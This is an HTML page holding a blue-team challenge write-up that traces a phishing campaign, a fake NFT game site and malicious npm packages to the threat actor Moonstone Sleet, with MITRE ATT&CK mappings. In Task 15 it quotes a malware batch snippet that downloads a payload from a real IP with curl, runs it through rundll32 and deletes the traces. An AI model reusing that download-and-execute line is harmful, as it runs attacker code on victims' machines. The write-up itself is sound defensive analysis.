@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="index, follow">
+    <title>TeamWork - Hexicon Archives</title>
+    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
+    <link rel="stylesheet" href="../style.css">
+    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/sherlocks/TeamWork.html" />
+    <!-- Sherlock-specific metadata for SEO -->
+    <meta name="description" content="Writeup for TeamWork sherlock - Easy difficulty level">
+    <meta name="keywords" content="Sherlock, TeamWork, Easy, Blue Team, writeup, cybersecurity, threat hunting, Hexicon">
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <a href="../sherlocks.html" class="logo">Sherlock writeups</a>
+            <div class="header-controls">
+                <a href="../index.html" class="htb-icon" title="Link to the main page">
+                    <img src="../favicon.png" alt="Archive" width="30" height="30">
+                </a>
+                <div class="hamburger-menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="sidebar">
+        <div class="difficulty-buttons">
+            <button class="difficulty-btn" data-difficulty="veasy">VEasy</button>
+            <div class="sherlock-list" id="veasy-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
+            <div class="sherlock-list" id="easy-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
+            <div class="sherlock-list" id="medium-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
+            <div class="sherlock-list" id="hard-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
+            <div class="sherlock-list" id="insane-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+        </div>
+    </div>
+    
+    <div class="backdrop"></div>
+    
+    <main class="container writeup-content">
+        <h1 class="writeup-title">TeamWork</h1>
+        <div class="writeup-metadata">
+            <span class="difficulty easy">Easy</span>
+            <span class="date">July 31, 2025</span>
+        </div>
+        
+        <div class="writeup-container">
+            <div class="writeup-body">
+                <!-- Sherlock-specific content goes here -->
+                <p><img alt="solved" src="../images/TeamWork/solved.png" /></p>
+<h1>Task 1</h1>
+<p>After unzipping the archive, I was left with a bunch of emails.</p>
+<p><img alt="emails" src="../images/TeamWork/emails.png" /></p>
+<p>This email mentioning NFTs immediately stood out to me, so I began my analysis by checking it first.</p>
+<p><img alt="mail" src="../images/TeamWork/mail.png" /></p>
+<p>The sender has provided Jason with a link to a zipped archive, alongside a password. I will try the sender's email <code>theodore.todtenhaupt@developingdreams.site</code> as my answer to task 1.</p>
+<p><img alt="task1" src="../images/TeamWork/task1.png" /></p>
+<h1>Task 2</h1>
+<p><img alt="whois" src="../images/TeamWork/whois.png" /></p>
+<p>Trying whois against the domain gave no results, so I pivoted to online searching.</p>
+<p>I tried VirusTotal, Alienvault, and a few more sites, but what gave me the needed information  was <code>https://www.whois.com/whois/</code></p>
+<p><img alt="site" src="../images/TeamWork/site.png" /></p>
+<p>I'll use the registration date as my answer to task 2.</p>
+<p><img alt="task2" src="../images/TeamWork/task2.png" /></p>
+<h1>Task 3</h1>
+<p>I went to the resource development category of the MITRE ATT&amp;CK database and searched for something that matches the attacker's actions.</p>
+<p><code>https://attack.mitre.org/tactics/TA0042/</code></p>
+<p>The technique <code>T1583.001</code> fits this scenario. Its description states:</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">Adversaries</span><span class="w"> </span><span class="nx">may</span><span class="w"> </span><span class="nx">acquire</span><span class="w"> </span><span class="nx">domains</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">can</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">used</span><span class="w"> </span><span class="nx">during</span><span class="w"> </span><span class="nx">targeting</span><span class="p">.</span>
+<span class="nx">Domain</span><span class="w"> </span><span class="nx">names</span><span class="w"> </span><span class="nx">are</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">human</span><span class="w"> </span><span class="nx">readable</span><span class="w"> </span><span class="nx">names</span><span class="w"> </span><span class="nx">used</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">represent</span><span class="w"> </span><span class="nx">one</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="nx">more</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">addresses</span><span class="p">.</span>
+<span class="nx">They</span><span class="w"> </span><span class="nx">can</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">purchased</span><span class="w"> </span><span class="k">or</span><span class="p">,</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nx">some</span><span class="w"> </span><span class="nx">cases</span><span class="p">,</span><span class="w"> </span><span class="nx">acquired</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">free</span><span class="p">.</span><span class="w"> </span>
+</code></pre></div>
+
+<p>The attacker did own a domain, from which a suspicious-looking archive was distributed.</p>
+<p>I'll use this technique ID as my answer to task 3.</p>
+<p><img alt="task3" src="../images/TeamWork/task3.png" /></p>
+<h1>Task 4</h1>
+<p>I wanted to explore the domain, but it seems like it got taken down/removed from the internet.</p>
+<p><img alt="fail" src="../images/TeamWork/fail.png" /></p>
+<p>However, that does not mean it cannot be accessed. There is a chance that it has been archived.</p>
+<p>I'll go to the web archive, and I'll search for the site.</p>
+<p><code>https://web.archive.org/</code></p>
+<p><img alt="save" src="../images/TeamWork/save.png" /></p>
+<p>It has been saved once on <code>February 4, 2025</code>. I'll check out the snapshot.</p>
+<p><img alt="site2" src="../images/TeamWork/site2.png" /></p>
+<p>I can see the site as it was on the day of the snapshot. Scrolling down, I can see a few social media links.</p>
+<p><img alt="links" src="../images/TeamWork/links.png" /></p>
+<p>And while none of these were archived, I could take the Twitter (x) link and use it as my answer for task 4.</p>
+<p><code>https://x.com/Develop_Dreams</code></p>
+<p><img alt="task4" src="../images/TeamWork/task4.png" /></p>
+<h1>Task 5</h1>
+<p>I went back to the MITRE website and searched for entries related to social media profiles.</p>
+<p>Initially, I focused on the ID <code>T1586</code> technique <code>Compromise Accounts</code>, because I thought that the attacker may have compromised existing accounts tied to the company.</p>
+<p>I was most likely wrong. It may have been that the attacker recreated the company account after its deletion and used it for their attack.</p>
+<p>With that in mind, I searched through the MITRE website again and found <code>T1585: Establish Accounts</code>, which would fit the narrative well. The subtechnique os <code>.001</code> would be exactly what the attacker did.</p>
+<p><img alt="task5" src="../images/TeamWork/task5.png" /></p>
+<h1>Task 6</h1>
+<p>Back on the archived site, there were 2 games to download.</p>
+<p><img alt="games" src="../images/TeamWork/games.png" /></p>
+<p>Remembering what was said in the email, I'll take the P2E, NFT beta game.</p>
+<p>Before doing anything with it, I'll take its name as my answer to task 6.</p>
+<p><img alt="task6" src="../images/TeamWork/task6.png" /></p>
+<h1>Task 7</h1>
+<p><img alt="pass" src="../images/TeamWork/pass.png" /></p>
+<p>The archive required a password. It was sent through the mail as well, and it was <code>DTWBETA2025</code></p>
+<p><img alt="exe" src="../images/TeamWork/exe.png" /></p>
+<p>It contains a single executable file. I'll get its SHA256 hash by running <code>sha256sum</code></p>
+<p><code>56554117d96d12bd3504ebef2a8f28e790dd1fe583c33ad58ccbf614313ead8c</code></p>
+<p>I'll use this hash as my answer to task 7.</p>
+<p><img alt="task7" src="../images/TeamWork/task7.png" /></p>
+<h1>Task 8</h1>
+<p>On the MITRE website, I searched for techniques related to file uploads and file hosting. I quickly found a matching one.</p>
+<p><code>T1608: Stage Capabilities</code></p>
+<div class="codehilite"><pre><span></span><code><span class="n">Adversaries</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">upload</span><span class="p">,</span><span class="w"> </span><span class="n">install</span><span class="p">,</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">otherwise</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="n">capabilities</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="n">during</span><span class="w"> </span><span class="n">targeting</span><span class="o">.</span>
+<span class="n">To</span><span class="w"> </span><span class="n">support</span><span class="w"> </span><span class="n">their</span><span class="w"> </span><span class="n">operations</span><span class="p">,</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">adversary</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">need</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">take</span><span class="w"> </span><span class="n">capabilities</span><span class="w"> </span><span class="n">they</span><span class="w"> </span><span class="n">developed</span><span class="w"> </span><span class="p">(</span><span class="n">Develop</span><span class="w"> </span><span class="n">Capabilities</span><span class="p">)</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">obtained</span><span class="w"> </span><span class="p">(</span><span class="n">Obtain</span><span class="w"> </span><span class="n">Capabilities</span><span class="p">)</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">stage</span><span class="w"> </span><span class="n">them</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">infrastructure</span><span class="w"> </span><span class="n">under</span><span class="w"> </span><span class="n">their</span><span class="w"> </span><span class="n">control</span><span class="o">.</span>
+<span class="n">These</span><span class="w"> </span><span class="n">capabilities</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">staged</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">infrastructure</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">previously</span><span class="w"> </span><span class="n">purchased</span><span class="o">/</span><span class="n">rented</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">adversary</span><span class="w"> </span><span class="p">(</span><span class="n">Acquire</span><span class="w"> </span><span class="n">Infrastructure</span><span class="p">)</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">otherwise</span><span class="w"> </span><span class="n">compromised</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">them</span><span class="w"> </span><span class="p">(</span><span class="n">Compromise</span><span class="w"> </span><span class="n">Infrastructure</span><span class="p">)</span><span class="o">.</span>
+<span class="n">Capabilities</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">also</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">staged</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">web</span><span class="w"> </span><span class="n">services</span><span class="p">,</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">GitHub</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">Pastebin</span><span class="p">,</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">Platform</span><span class="o">-</span><span class="k">as</span><span class="o">-</span><span class="n">a</span><span class="o">-</span><span class="n">Service</span><span class="w"> </span><span class="p">(</span><span class="n">PaaS</span><span class="p">)</span><span class="w"> </span><span class="n">offerings</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">enable</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">easily</span><span class="w"> </span><span class="n">provision</span><span class="w"> </span><span class="n">applications</span><span class="o">.</span><span class="w"> </span>
+</code></pre></div>
+
+<p>And the <code>.001</code> subtechnique.</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Upload malware</span>
+
+<span class="n">Adversaries</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">upload</span><span class="w"> </span><span class="n">malware</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">third</span><span class="o">-</span><span class="n">party</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">adversary</span><span class="w"> </span><span class="n">controlled</span><span class="w"> </span><span class="n">infrastructure</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">make</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">accessible</span><span class="w"> </span><span class="n">during</span><span class="w"> </span><span class="n">targeting</span><span class="o">.</span>
+<span class="n">Malicious</span><span class="w"> </span><span class="n">software</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">include</span><span class="w"> </span><span class="n">payloads</span><span class="p">,</span><span class="w"> </span><span class="n">droppers</span><span class="p">,</span><span class="w"> </span><span class="n">post</span><span class="o">-</span><span class="n">compromise</span><span class="w"> </span><span class="n">tools</span><span class="p">,</span><span class="w"> </span><span class="n">backdoors</span><span class="p">,</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">variety</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">malicious</span><span class="w"> </span><span class="n">content</span><span class="o">.</span>
+<span class="n">Adversaries</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">upload</span><span class="w"> </span><span class="n">malware</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">support</span><span class="w"> </span><span class="n">their</span><span class="w"> </span><span class="n">operations</span><span class="p">,</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">making</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="n">available</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">victim</span><span class="w"> </span><span class="n">network</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">enable</span><span class="w"> </span><span class="n">Ingress</span><span class="w"> </span><span class="n">Tool</span><span class="w"> </span><span class="n">Transfer</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">placing</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">Internet</span><span class="w"> </span><span class="n">accessible</span><span class="w"> </span><span class="n">web</span><span class="w"> </span><span class="n">server</span><span class="o">.</span><span class="w"> </span>
+</code></pre></div>
+
+<p><img alt="task8" src="../images/TeamWork/task8.png" /></p>
+<h1>Task 9</h1>
+<p>I took the hash from task 7 and checked it with Virustotal.</p>
+<p><img alt="detect" src="../images/TeamWork/detect.png" /></p>
+<p>It's detected as malware, and there are 2 comments.</p>
+<p><img alt="comment" src="../images/TeamWork/comment.png" /></p>
+<p>The comment made by <code>patricksvgrapi</code> reveals the threat actor and links to an interesting Microsoft article.</p>
+<p>I'll use the TA's name as my answer to task 9.</p>
+<p><img alt="task9" src="../images/TeamWork/task9.png" /></p>
+<h1>Task 10</h1>
+<p><code>https://www.microsoft.com/en-us/security/blog/2024/05/28/moonstone-sleet-emerges-as-new-north-korean-threat-actor-with-new-bag-of-tricks/</code></p>
+<p><img alt="sni" src="../images/TeamWork/sni.png" /></p>
+<p>This article reveals that Moonstone Sleet is a North Korean threat actor. The behavior listed in the report closely matches what I've seen so far in this scenario, ranging from a fake blockchain company/website to the usage of a malicious tank game <code>DeTankWar</code></p>
+<p><img alt="task10" src="../images/TeamWork/task10.png" /></p>
+<p>This also means that I was <em>completely</em> wrong in task 5. The website was not reused after deletion nor overtaken, it was a fake from the beginning, its sole purpose being to distribute malware and appear legitimate.</p>
+<h1>Task 11</h1>
+<p>Reading more into the Microsoft article, it is mentioned that Moonstone Sleet used a trojanized version of <code>PuTTY</code> (a free and open-source terminal emulator) as an initiator of a multi-stage infection.</p>
+<p><img alt="microsoft" src="../images/TeamWork/microsoft.png" /></p>
+<p>I'll use <code>PuTTY</code> as my answer to task 11.</p>
+<p><img alt="task11" src="../images/TeamWork/task11.png" /></p>
+<h1>Task 12</h1>
+<p>On the MITRE ATT&amp;CK website, I searched for <code>Moonstone Sleet</code></p>
+<p><code>https://attack.mitre.org/groups/G1036/</code></p>
+<p>One of the techniques used by this group was <code>T1195.002: Supply Chain Compromise: Compromise Software Supply Chain</code> with a note of:</p>
+<p><code>Moonstone Sleet has distributed a trojanized version of PuTTY software for initial access to victims</code></p>
+<p>This, of course, matches with the trojanized PuTTY software from the earlier question and the report, so I'll use this technique ID as my answer to task 12.</p>
+<p><img alt="task12" src="../images/TeamWork/task12.png" /></p>
+<h1>Task 13</h1>
+<p>I searched <code>Moonstone sleet july 2024</code> on google, and found an interesting article.</p>
+<p><code>https://securitylabs.datadoghq.com/articles/stressed-pungsan-dprk-aligned-threat-actor-leverages-npm-for-initial-access/</code></p>
+<p>Npm is the package manager for Node.js, containing hundreds of thousands of packages used by developers all around the world.</p>
+<p>I'll use <code>npm</code> as my answer to task 13.</p>
+<p><img alt="task12" src="../images/TeamWork/task13.png" /></p>
+<h1>Task 14</h1>
+<p>Looking at the article, the two malicious packages were <code>harthat-hash</code> and <code>harthat-api</code></p>
+<p><img alt="fail2" src="../images/TeamWork/fail2.png" /></p>
+<p>Both of them were already taken down from npm, and none of them were archived via the Wayback Machine.</p>
+<p><img alt="package" src="../images/TeamWork/package.png" /></p>
+<p>The article contains everything I need, though. I'll use <code>harthat-hash v1.3.3</code> as my answer to task 14.</p>
+<p><img alt="task14" src="../images/TeamWork/task14.png" /></p>
+<h1>Task 15</h1>
+<p>Scrolling down through the article, there is a detection tied to a suspicious URL.</p>
+<p><img alt="ip" src="../images/TeamWork/ip.png" /></p>
+<div class="codehilite"><pre><span></span><code><span class="k">const</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;@echo off</span><span class="se">\n</span><span class="s1">curl -o Temp.b -L &quot;http://142.111.77.196/user/user.asp?id=237596&quot; &gt; nul 2&gt;&amp;1</span><span class="se">\n</span><span class="s1">rename Temp.b package.db &gt; nul 2&gt;&amp;1</span><span class="se">\n</span><span class="s1">rundll32 package.db,GenerateKey 1234</span><span class="se">\n</span><span class="s1">del &quot;package.db&quot;</span><span class="se">\n</span><span class="s1">if exist &quot;pk.json&quot; (</span><span class="se">\n</span><span class="s1">del &quot;package.json&quot; &gt; n... 2&gt;&amp;1</span><span class="se">\n</span><span class="s1">)&#39;</span><span class="p">;</span>
+</code></pre></div>
+
+<p>A file curled from the suspicious IP <code>Temp.b</code> is renamed to <code>package.db</code>. The package.db file is then executed via rundll32, which suggests that the file is actually a .dll.</p>
+<p>It then executes a <code>GenerateKey</code> function with an argument of 1234. Lastly, it cleans up every trace left behind.</p>
+<p><img alt="task15" src="../images/TeamWork/task15.png" /></p>
+<h1>Task 16</h1>
+<p>For the last task, I went back to the MITRE ATT&amp;CK website. I looked around, and after a while, I found a matching technique.</p>
+<p><code>T1218: System Binary Proxy Execution</code></p>
+<div class="codehilite"><pre><span></span><code><span class="n">Adversaries</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">bypass</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="ow">and</span><span class="o">/</span><span class="ow">or</span><span class="w"> </span><span class="n">signature</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">defenses</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">proxying</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">malicious</span><span class="w"> </span><span class="n">content</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">signed</span><span class="p">,</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">otherwise</span><span class="w"> </span><span class="n">trusted</span><span class="p">,</span><span class="w"> </span><span class="n">binaries</span><span class="o">.</span>
+<span class="n">Binaries</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">technique</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">often</span><span class="w"> </span><span class="n">Microsoft</span><span class="o">-</span><span class="n">signed</span><span class="w"> </span><span class="n">files</span><span class="p">,</span><span class="w"> </span><span class="n">indicating</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">they</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="n">either</span><span class="w"> </span><span class="n">downloaded</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">already</span><span class="w"> </span><span class="n">native</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">operating</span><span class="w"> </span><span class="n">system</span><span class="o">.</span>
+<span class="n">Binaries</span><span class="w"> </span><span class="n">signed</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">trusted</span><span class="w"> </span><span class="n">digital</span><span class="w"> </span><span class="n">certificates</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">typically</span><span class="w"> </span><span class="n">execute</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">systems</span><span class="w"> </span><span class="n">protected</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">digital</span><span class="w"> </span><span class="n">signature</span><span class="w"> </span><span class="n">validation</span><span class="o">.</span>
+<span class="n">Several</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">signed</span><span class="w"> </span><span class="n">binaries</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">default</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">installations</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">proxy</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">commands</span><span class="o">.</span><span class="w"> </span>
+</code></pre></div>
+
+<p>The <code>.011</code> subtechnique corresponds to rundll32.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">Adversaries</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">abuse</span><span class="w"> </span><span class="n">rundll32</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">proxy</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">malicious</span><span class="w"> </span><span class="n">code</span><span class="o">.</span>
+<span class="n">Using</span><span class="w"> </span><span class="n">rundll32</span><span class="o">.</span><span class="n">exe</span><span class="p">,</span><span class="w"> </span><span class="n">vice</span><span class="w"> </span><span class="n">executing</span><span class="w"> </span><span class="n">directly</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="w"> </span><span class="n">Shared</span><span class="w"> </span><span class="n">Modules</span><span class="p">),</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">avoid</span><span class="w"> </span><span class="n">triggering</span><span class="w"> </span><span class="n">security</span><span class="w"> </span><span class="n">tools</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">monitor</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">rundll32</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="n">because</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">allowlists</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="bp">false</span><span class="w"> </span><span class="n">positives</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">normal</span><span class="w"> </span><span class="n">operations</span><span class="o">.</span>
+<span class="n">Rundll32</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">commonly</span><span class="w"> </span><span class="n">associated</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">executing</span><span class="w"> </span><span class="n">DLL</span><span class="w"> </span><span class="n">payloads</span><span class="w"> </span><span class="p">(</span><span class="n">ex</span><span class="p">:</span><span class="w"> </span><span class="n">rundll32</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="p">{</span><span class="n">DLLname</span><span class="p">,</span><span class="w"> </span><span class="n">DLLfunction</span><span class="p">})</span><span class="o">.</span><span class="w"> </span>
+</code></pre></div>
+
+<p>I'll use <code>T1218.011</code> as my answer to task 16.</p>
+<p><img alt="task16" src="../images/TeamWork/task16.png" /></p>
+<p>Solved!</p>
+            </div>
+            
+            <div class="toc-sidebar">
+                <h3>Contents</h3>
+                <ul id="toc-list">
+                    <!-- This will be populated by JavaScript -->
+                </ul>
+            </div>
+        </div>
+    </main>
+    
+    <!-- Mobile TOC toggle button -->
+    <button class="toc-toggle" aria-label="Toggle table of contents">
+        ≡
+    </button>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+        </div>
+    </footer>
+
+    <!-- Include the Markdown parser (not needed for static HTML) -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
+    
+    <script>
+        // Sherlock metadata for sidebar population
+        let sherlockData = {};
+        
+        // Function to initialize the application
+        async function initializeApp() {
+            try {
+                // Fetch sherlock metadata
+                const response = await fetch('../sherlocks.json');
+                if (!response.ok) {
+                    throw new Error('Failed to load sherlock metadata');
+                }
+                sherlockData = await response.json();
+                
+                // Populate the sidebar with sherlock links
+                populateSidebar();
+                
+                // Generate table of contents
+                generateTableOfContents();
+            } catch (error) {
+                console.error('Initialization error:', error);
+                showError("Failed to initialize application. Please refresh and try again.");
+            }
+        }
+
+        // Call the initialization function when the page loads
+        document.addEventListener('DOMContentLoaded', initializeApp);
+
+        // Populate sidebar with sherlock links dynamically
+        function populateSidebar() {
+            const categories = {
+                "veasy": document.getElementById("veasy-sherlocks"),
+                "easy": document.getElementById("easy-sherlocks"),
+                "medium": document.getElementById("medium-sherlocks"),
+                "hard": document.getElementById("hard-sherlocks"),
+                "insane": document.getElementById("insane-sherlocks")
+            };
+
+            // Clear existing links
+            for (const category of Object.values(categories)) {
+                category.innerHTML = '';
+            }
+
+            // Add sherlock links to appropriate categories
+            for (const [sherlockName, data] of Object.entries(sherlockData)) {
+                const difficulty = data.difficulty.toLowerCase();
+                if (categories[difficulty]) {
+                    const link = document.createElement('a');
+                    link.href = `../sherlocks/${sherlockName}.html`;
+                    link.textContent = data.title;
+                    
+                    // Highlight current sherlock
+                    if (data.title === "TeamWork") {
+                        link.classList.add('active');
+                    }
+                    
+                    categories[difficulty].appendChild(link);
+                }
+            }
+        }
+
+        // Generate table of contents from headings
+        function generateTableOfContents() {
+            const writeupBody = document.querySelector('.writeup-body');
+            const tocList = document.getElementById('toc-list');
+            const headings = writeupBody.querySelectorAll('h1, h2, h3');
+            
+            // Clear existing TOC
+            tocList.innerHTML = '';
+            
+            headings.forEach((heading, index) => {
+                // Create an ID for the heading if it doesn't have one
+                if (!heading.id) {
+                    // Convert heading text to kebab-case for ID
+                    const headingText = heading.textContent.trim();
+                    const headingId = headingText
+                        .toLowerCase()
+                        .replace(/[^\w\s-]/g, '')
+                        .replace(/\s+/g, '-');
+                    
+                    heading.id = headingId || `section-${index}`;
+                }
+                
+                // Create a list item for the TOC
+                const listItem = document.createElement('li');
+                const link = document.createElement('a');
+                link.href = `#${heading.id}`;
+                link.textContent = heading.textContent;
+                
+                // Add a class for h2 elements to create indentation
+                if (heading.tagName === 'H2') {
+                    listItem.classList.add('sub-heading');
+                    listItem.style.paddingLeft = '15px';
+                } else if (heading.tagName === 'H3') {
+                    listItem.classList.add('sub-sub-heading');
+                    listItem.style.paddingLeft = '30px';
+                }
+                
+                listItem.appendChild(link);
+                tocList.appendChild(listItem);
+            });
+            
+            // Set up scroll highlighting
+            setupScrollHighlighting();
+        }
+
+        // Highlight active TOC section on scroll
+        function setupScrollHighlighting() {
+            const tocLinks = document.querySelectorAll('.toc-sidebar a');
+            
+            function highlightActiveSection() {
+                // Find which section is currently in view
+                const fromTop = window.scrollY + 120;
+                
+                tocLinks.forEach(link => {
+                    const section = document.querySelector(link.hash);
+                    
+                    if (section && 
+                        section.offsetTop <= fromTop &&
+                        section.offsetTop + section.offsetHeight > fromTop) {
+                        link.classList.add('active');
+                    } else {
+                        link.classList.remove('active');
+                    }
+                });
+            }
+            
+            // Call initially and on scroll
+            window.addEventListener('scroll', highlightActiveSection);
+            highlightActiveSection();
+        }
+
+        // Show error message
+        function showError(message) {
+            const contentArea = document.querySelector('.writeup-body');
+            contentArea.innerHTML = `
+                <div class="error-message">
+                    <h2>Error</h2>
+                    <p>${message}</p>
+                </div>
+            `;
+        }
+
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hamburger menu functionality
+            const hamburgerMenu = document.querySelector('.hamburger-menu');
+            const sidebar = document.querySelector('.sidebar');
+            const backdrop = document.querySelector('.backdrop');
+            
+            hamburgerMenu.addEventListener('click', () => {
+                hamburgerMenu.classList.toggle('active');
+                sidebar.classList.toggle('active');
